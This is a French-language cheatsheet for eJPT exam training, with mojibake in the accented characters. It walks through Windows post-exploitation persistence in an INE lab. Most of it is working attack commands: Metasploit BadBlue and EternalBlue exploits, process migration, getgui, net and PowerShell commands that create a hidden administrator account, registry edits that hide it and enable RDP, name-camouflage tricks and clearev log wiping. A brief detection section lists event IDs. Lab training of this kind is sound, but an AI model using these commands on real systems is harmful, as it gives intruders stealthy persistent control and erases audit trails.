# üë§ Windows User Persistence & Hidden Account - Cheatsheet eJPT

## üéØ 1. Vue d'ensemble de la persistence par utilisateur

### Concept de base
La **persistence par cr√©ation d'utilisateur** consiste √† :
1. **Cr√©er un compte utilisateur malveillant** avec privil√®ges administrateur
2. **Masquer l'utilisateur** de l'√©cran de connexion Windows
3. **Activer RDP** pour acc√®s √† distance
4. **Maintenir l'acc√®s GUI** m√™me apr√®s reboot
5. **Survivre aux changements** de mot de passe admin principal

### Avantages de cette technique
- ‚úÖ **Acc√®s GUI complet** via RDP
- ‚úÖ **Persistence** apr√®s red√©marrage
- ‚úÖ **Utilisateur cach√©** de l'√©cran login
- ‚úÖ **Privil√®ges administrateur** maintenus
- ‚úÖ **Acc√®s ind√©pendant** du compte admin principal
- ‚úÖ **Interface famili√®re** Windows

---

## üõ†Ô∏è 2. Exploitation initiale (BadBlue 2.7)

### D√©couverte et √©num√©ration
```bash
# 1. Test de connectivit√©
ping -c 4 demo.ine.local

# 2. Scan de d√©couverte
nmap demo.ine.local

# 3. √ânum√©ration service web
nmap -sV -p 80 demo.ine.local

# 4. Recherche exploits BadBlue
searchsploit badblue 2.7
searchsploit badblue
```

### Exploitation avec Metasploit
```bash
# 1. Lancer Metasploit
msfconsole -q

# 2. Utiliser exploit BadBlue PassThru
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
set LHOST your_kali_ip
show options
exploit

# 3. V√©rifier acc√®s obtenu
getuid
sysinfo
ps
```

**üî• Note :** BadBlue 2.7 est vuln√©rable √† un buffer overflow via la fonction PassThru.

---

## üîÑ 3. Migration de processus (Stabilisation)

### Pourquoi migrer ?
- **Stabilit√©** : Process plus stable qu'un service web
- **Persistance** : explorer.exe red√©marre automatiquement
- **Discr√©tion** : Processus l√©gitime moins suspect
- **Privil√®ges** : Maintien des privil√®ges administrateur

### Migration vers explorer.exe
```bash
# 1. Identifier PID d'explorer.exe
ps -S explorer.exe
ps aux | grep explorer

# 2. Migrer vers explorer.exe
migrate 2764                           # Remplacer par PID trouv√©

# 3. V√©rifier migration r√©ussie
getpid
ps -p                                  # Voir processus actuel
```

### Alternatives de migration
```bash
# Autres processus stables pour migration
ps -S winlogon.exe                     # Processus de connexion
ps -S lsass.exe                        # Local Security Authority
ps -S services.exe                     # Service Control Manager
ps -S svchost.exe                      # Host service processes

# Migration alternative
migrate <pid_process_stable>
```

---

## üë§ 4. Commande getgui (Meterpreter)

### Fonctionnalit√©s de getgui
La commande `getgui` effectue automatiquement :
- ‚úÖ **Activation RDP** si d√©sactiv√©
- ‚úÖ **Cr√©ation utilisateur** avec mot de passe
- ‚úÖ **Masquage utilisateur** de l'√©cran de login
- ‚úÖ **Ajout aux groupes** Administrators et Remote Desktop Users
- ‚úÖ **Configuration firewall** pour RDP

### Syntaxe et options getgui
```bash
# Syntaxe de base
run getgui -e -u <username> -p <password>

# Options d√©taill√©es
run getgui -h                          # Aide
run getgui -e                          # Enable RDP seulement
run getgui -u alice -p password123     # Cr√©er utilisateur
run getgui -e -u alice -p password123  # Enable RDP + cr√©er user
run getgui -f 5555 -e                  # Port RDP personnalis√©
```

### Exemple complet
```bash
# Cr√©ation utilisateur cach√© avec RDP
run getgui -e -u alice -p hack_123321

# Ce qui est ex√©cut√© automatiquement :
# 1. net user alice hack_123321 /add
# 2. net localgroup Administrators alice /add
# 3. net localgroup "Remote Desktop Users" alice /add
# 4. reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v alice /t REG_DWORD /d 0
# 5. netsh firewall set service remotedesktop enable
```

---

## üîß 5. Cr√©ation manuelle d'utilisateur cach√©

### Commandes natives Windows
```cmd
# 1. Cr√©er utilisateur
net user alice hack_123321 /add

# 2. Ajouter aux groupes administrateurs
net localgroup Administrators alice /add
net localgroup "Remote Desktop Users" alice /add

# 3. Masquer de l'√©cran de connexion
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v alice /t REG_DWORD /d 0

# 4. Activer RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0

# 5. Autoriser RDP dans le firewall
netsh firewall set service remotedesktop enable
netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes
```

### PowerShell √©quivalent
```powershell
# Cr√©er utilisateur avec PowerShell
New-LocalUser -Name "alice" -Password (ConvertTo-SecureString "hack_123321" -AsPlainText -Force) -PasswordNeverExpires

# Ajouter aux groupes
Add-LocalGroupMember -Group "Administrators" -Member "alice"
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "alice"

# Masquer utilisateur
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "alice" -Value 0 -PropertyType DWord

# Activer RDP
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
```

### Via Meterpreter (commandes individuelles)
```bash
# Dans session Meterpreter
execute -f net -a "user alice hack_123321 /add"
execute -f net -a "localgroup Administrators alice /add"
execute -f net -a "localgroup \"Remote Desktop Users\" alice /add"

# Masquer utilisateur via registry
reg setval -k "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" -v alice -t REG_DWORD -d 0

# Activer RDP
reg setval -k "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" -v fDenyTSConnections -t REG_DWORD -d 0
```

---

## üîç 6. Masquage avanc√© de l'utilisateur

### Registry - SpecialAccounts
```cmd
# Masquer compl√®tement de l'√©cran login
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v alice /t REG_DWORD /d 0

# V√©rifier le masquage
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
```

### Techniques avanc√©es de masquage
```cmd
# 1. Nom d'utilisateur discret (avec espaces)
net user "System " hack_123321 /add        # Espace √† la fin
net user "svchost" hack_123321 /add         # Nom syst√®me l√©gitime

# 2. Utilisateur avec $ (compte machine)
net user "backup$" hack_123321 /add

# 3. Caract√®res Unicode invisibles
net user "admin‚Äã" hack_123321 /add          # Zero-width space
```

### V√©rification du masquage
```cmd
# L'utilisateur ne doit PAS appara√Ætre ici :
# - √âcran de connexion Windows
# - Menu d√©marrer ‚Üí changer d'utilisateur
# - Panneau de configuration ‚Üí Comptes utilisateurs

# Mais visible ici :
net user                                    # Liste tous les users
lusrmgr.msc                                # Gestionnaire d'utilisateurs
wmic useraccount list brief                # WMI query
```

---

## üñ•Ô∏è 7. Acc√®s RDP et configuration

### Connexion RDP depuis Kali
```bash
# Avec xfreerdp (recommand√©)
xfreerdp /u:alice /p:hack_123321 /v:demo.ine.local
xfreerdp /u:alice /p:hack_123321 /v:demo.ine.local /cert-ignore
xfreerdp /u:alice /p:hack_123321 /v:demo.ine.local:3389 /f

# Avec rdesktop
rdesktop -u alice -p hack_123321 demo.ine.local
rdesktop -u alice -p hack_123321 -f demo.ine.local

# Accepter le certificat si demand√©
Y [Accept the certificate]
```

### Options RDP avanc√©es
```bash
# R√©solution personnalis√©e
xfreerdp /u:alice /p:hack_123321 /v:target /size:1024x768

# Partage de r√©pertoire
xfreerdp /u:alice /p:hack_123321 /v:target /drive:share,/tmp

# Copier-coller activ√©
xfreerdp /u:alice /p:hack_123321 /v:target +clipboard

# Port RDP personnalis√©
xfreerdp /u:alice /p:hack_123321 /v:target:13389
```

### Configuration RDP c√¥t√© Windows
```cmd
# V√©rifier statut RDP
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections

# Changer port RDP (optionnel)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp" /v PortNumber /t REG_DWORD /d 13389

# D√©sactiver NLA (si probl√®me connexion)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0
```

---

## üõ°Ô∏è 8. D√©tection et contre-mesures

### D√©tection c√¥t√© d√©fenseur
```cmd
# Lister tous les utilisateurs
net user
wmic useraccount list brief

# V√©rifier groupes administrateurs
net localgroup Administrators

# V√©rifier utilisateurs cach√©s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"

# Sessions RDP actives
quser
qwinsta

# Logs d'√©v√©nements Windows
# Event ID 4720: Account created
# Event ID 4724: Password reset
# Event ID 4732: Member added to group
# Event ID 4648: Logon with explicit credentials
```

### Nettoyage des traces
```bash
# Dans Meterpreter
clearev                                 # Clear Event Logs

# Supprimer utilisateur
execute -f net -a "user alice /delete"

# Nettoyer registry
reg deleteval -k "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" -v alice
```

---

## üéØ 9. Cas d'usage sp√©cifiques eJPT

### Sc√©nario 1: BadBlue ‚Üí User Persistence
```bash
# 1. Exploitation
use exploit/windows/http/badblue_passthru
set RHOSTS target; set LHOST attacker; exploit

# 2. Migration stabilit√©
ps -S explorer.exe
migrate <explorer_pid>

# 3. Cr√©ation user cach√© + RDP
run getgui -e -u alice -p hack_123321

# 4. Test connexion RDP
xfreerdp /u:alice /p:hack_123321 /v:target /cert-ignore
```

### Sc√©nario 2: SMB ‚Üí User Persistence
```bash
# 1. EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target; set LHOST attacker; exploit

# 2. Migration + getgui
ps -S explorer.exe; migrate <pid>
run getgui -e -u backup -p Password123

# 3. Acc√®s RDP
xfreerdp /u:backup /p:Password123 /v:target
```

### Sc√©nario 3: Cr√©ation manuelle apr√®s shell
```bash
# Si pas de Meterpreter, cr√©ation manuelle
# 1. Dans shell Windows
net user hacker Pass123! /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add

# 2. Masquer utilisateur
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v hacker /t REG_DWORD /d 0

# 3. Activer RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0
```

---

## üí° 10. Conseils et astuces eJPT

### Points critiques pour l'exam
- ‚úÖ **Migration obligatoire** pour stabilit√©
- ‚úÖ **Tester connexion RDP** apr√®s cr√©ation
- ‚úÖ **Utilisateur vraiment cach√©** de l'√©cran login
- ‚úÖ **Privil√®ges administrateur** confirm√©s
- ‚úÖ **Documenter credentials** cr√©√©s

### Erreurs courantes √† √©viter
- ‚ùå **Pas de migration** ‚Üí Session instable
- ‚ùå **Utilisateur non masqu√©** ‚Üí Visible au login
- ‚ùå **RDP non activ√©** ‚Üí Connexion impossible
- ‚ùå **Mot de passe faible** ‚Üí D√©tection facile
- ‚ùå **Nom suspect** ‚Üí alice, hacker, backdoor

### Optimisations eJPT
```bash
# Noms d'utilisateurs discrets
run getgui -e -u support -p Help123!
run getgui -e -u backup -p Backup2023
run getgui -e -u service -p Service123

# V√©rification rapide apr√®s cr√©ation
execute -f net -a "user"               # Voir si user cr√©√©
execute -f net -a "localgroup Administrators"  # Voir si dans admin
```

### One-liner apr√®s exploitation
```bash
# Migration + User + RDP en une s√©quence
ps -S explorer.exe && migrate <pid> && run getgui -e -u alice -p hack_123321
```

### Workflow optimis√© examen
```bash
# 1. Exploitation
use exploit/windows/http/badblue_passthru; set RHOSTS target; set LHOST attacker; exploit

# 2. Stabilisation + Persistence
ps -S explorer.exe; migrate <pid>; run getgui -e -u alice -p hack_123321

# 3. Test imm√©diat
# Nouveau terminal Kali :
xfreerdp /u:alice /p:hack_123321 /v:target /cert-ignore
```

---

## üìã 11. Checklist de persistence utilisateur

### ‚úÖ Validation √©tape par √©tape
- [ ] **Exploitation initiale** r√©ussie
- [ ] **Privil√®ges Admin** confirm√©s (`getuid`)
- [ ] **Migration** vers processus stable effectu√©e
- [ ] **Utilisateur cr√©√©** avec `getgui` ou manuellement
- [ ] **RDP activ√©** et configur√©
- [ ] **Utilisateur masqu√©** de l'√©cran de connexion
- [ ] **Groupes admin** assign√©s
- [ ] **Test connexion RDP** r√©ussi
- [ ] **Acc√®s GUI** complet fonctionnel

### üìù Informations √† documenter
- **Nom d'utilisateur** cr√©√©
- **Mot de passe** associ√©
- **Port RDP** utilis√© (d√©faut 3389)
- **M√©thode de masquage** employ√©e
- **Commande de nettoyage** si n√©cessaire

### üîç V√©rifications post-cr√©ation
```bash
# Dans Meterpreter
execute -f net -a "user alice"         # Info utilisateur
execute -f net -a "localgroup Administrators"  # V√©rifier groupe
reg queryval -k "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" -v alice  # V√©rifier masquage
```

**üéØ Conseil final eJPT :** La persistence par utilisateur cach√© offre un **acc√®s GUI complet** tr√®s pratique pour l'administration post-exploitation. Technique tr√®s stable et discr√®te si bien impl√©ment√©e. Toujours migrer vers explorer.exe avant getgui pour assurer la stabilit√© !